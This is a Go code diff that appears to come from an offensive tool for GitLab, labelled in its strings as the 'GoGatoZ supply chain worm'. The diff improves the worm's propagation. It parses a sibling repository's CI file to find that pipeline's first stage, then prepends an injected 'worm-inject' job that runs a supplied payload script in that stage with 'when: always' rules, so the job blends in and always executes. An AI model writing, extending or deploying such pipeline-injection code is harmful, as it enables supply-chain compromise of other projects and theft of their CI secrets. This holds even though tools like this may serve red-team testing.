@@ -6,6 +6,7 @@ import (
 	"fmt"
 	"io"
 	"os"
+	"regexp"
 	"strings"
 
 	gitlab "gitlab.com/gitlab-org/api/client-go"
@@ -356,6 +357,27 @@ func discoverSiblings(ctx context.Context, client *gitlab.Client, groupPath, tar
 	return siblings, ""
 }
 
+var stagesInlineRe = regexp.MustCompile(`(?m)^stages:\s*\[([^\]]+)\]`)
+var stagesBlockRe = regexp.MustCompile(`(?m)^stages:\s*\n\s*-\s*(\S+)`)
+var safeStageRe = regexp.MustCompile(`^[a-zA-Z0-9_.-]+$`)
+
+func detectFirstStage(ciContent string) string {
+	var candidate string
+	if m := stagesInlineRe.FindStringSubmatch(ciContent); len(m) > 1 {
+		parts := strings.Split(m[1], ",")
+		candidate = strings.TrimSpace(parts[0])
+	}
+	if candidate == "" {
+		if m := stagesBlockRe.FindStringSubmatch(ciContent); len(m) > 1 {
+			candidate = strings.TrimSpace(m[1])
+		}
+	}
+	if candidate != "" && safeStageRe.MatchString(candidate) {
+		return candidate
+	}
+	return "build"
+}
+
 func buildWormCI(ctx context.Context, client *gitlab.Client, sibID int64, payload string) string {
 	indented := indentScript(payload, "      ")
 	f, _, ferr := client.RepositoryFiles.GetFile(
@@ -366,16 +388,19 @@ func buildWormCI(ctx context.Context, client *gitlab.Client, sibID int64, payloa
 	if ferr == nil && f != nil {
 		decoded, _ := base64.StdEncoding.DecodeString(f.Content)
 		existing := string(decoded)
-		return fmt.Sprintf("# Auto-injected by GoGatoZ supply chain worm\nstages: [worm]\nworm-inject:\n  stage: worm\n  script:\n    - |\n%s\n  allow_failure: true\n\n%s", indented, existing)
+		firstStage := detectFirstStage(existing)
+		return fmt.Sprintf("# Auto-injected by GoGatoZ supply chain worm\nworm-inject:\n  stage: %s\n  script:\n    - |\n%s\n  allow_failure: true\n  rules:\n    - when: always\n\n%s", firstStage, indented, existing)
 	}
-	return fmt.Sprintf(`stages: [worm]
+	return fmt.Sprintf(`stages: [build]
 worm-inject:
-  stage: worm
+  stage: build
   script:
     - |
 %s
     - echo "[*] Supply chain worm propagation complete"
   allow_failure: true
+  rules:
+    - when: always
 `, indented)
 }
 
